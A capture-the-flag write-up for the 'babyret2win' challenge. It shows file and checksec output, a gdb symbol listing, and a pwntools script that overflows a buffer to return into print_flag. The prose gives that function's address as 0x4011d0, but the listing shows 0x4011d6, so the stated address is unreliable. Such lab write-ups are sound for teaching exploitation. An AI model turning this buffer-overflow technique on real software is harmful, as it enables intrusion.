# babyret2win

This challenge was incredibly easy, I'm not even sure if its worth it to do a writeup, but here it is anyway.

Download binary from site:

<pre lang="md">$ wget https://ctf.mcpt.ca/media/problem/mXcRUMoBm9VNveWdDtaUYE1jrkkKZyRjNzNvBUhoJrQ/babybof.zip </pre>
Before running it I want to check the basic information. 

```bash 
$ file babyret2win
babyret2win: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=6699503ebd1ea7ab332f6db957bce4bd8abea64d, for GNU/Linux 3.2.0, not stripped
```

So, now we know that its a 64 bit ELF program, and not stripped. These are the most important parts. As it's not stripped it should be easy to debug and reverse engineer.

Lets check the protections: 

```shell 
$ checksec --file=babyret2win
[*] '/home/julianb/home/ctf/pwn/babyret2win/babyret2win/babyret2win'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No

```

Perfect! There's no PIE and no canary. We should be free to reverse engineer the program to find the address for the win function. Now we can run the file.

`$ ./babyret2win`

Wow thats a lot of text.... I dont think I'll put it all here as its just explaining how a ret2win works. 
At the end we get an input where we can enter our name. This is where we can do the exploit. 
First I will find the address for the win function with gdb. 

```shell
Non-debugging symbols:
0x0000000000401000  _init
0x0000000000401090  puts@plt
0x00000000004010a0  fgets@plt
0x00000000004010b0  gets@plt
0x00000000004010c0  setvbuf@plt
0x00000000004010d0  fopen@plt
0x00000000004010e0  getc@plt
0x00000000004010f0  _start
0x0000000000401120  _dl_relocate_static_pie
0x0000000000401130  deregister_tm_clones
0x0000000000401160  register_tm_clones
0x00000000004011a0  __do_global_dtors_aux
0x00000000004011d0  frame_dummy
0x00000000004011d6  print_flag
0x0000000000401226  main
0x00000000004013a0  __libc_csu_init
0x0000000000401410  __libc_csu_fini
0x0000000000401418  _fini
(gdb) 
```

So the name of the function we need to return to is `print_flag` and its address is `0x4011d0`. Great. Lets make the exploit!

```python
from pwn import *
import time

elf = context.binary = ELF('./babyret2win')
p = process()

#automate pressing enter 8 times to skip the tutorial
for i in range(8):
	p.sendline('')
	time.sleep(.05)

#create the payload by overflowing the buffer, finding the address for flag and packaging it
payload = b'A' * 56 + p64(elf.sym.print_flag)

p.sendline(payload)
p.interactive()
```

Now lets run it... 

...

Actually lets not, the tutorial is wayy too long so putting the output would mean including all that... yeah you'll just have to take my word for it. 
